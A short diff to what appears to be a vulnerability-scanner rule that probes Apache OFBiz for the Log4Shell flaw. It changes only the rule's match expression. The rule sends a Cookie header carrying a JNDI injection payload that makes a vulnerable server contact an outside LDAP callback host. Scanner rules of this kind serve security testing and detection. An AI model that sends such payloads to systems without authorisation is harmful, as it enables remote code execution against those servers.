@@ -16,7 +16,7 @@ rules:
       path: /webtools/control/main
       headers:
         Cookie: OFBiz.Visitor=${jndi:ldap://{{dnstest}}/tea}
-    expression: "true"
+    expression: response.status >= 200
   r2:
     request:
       method: GET
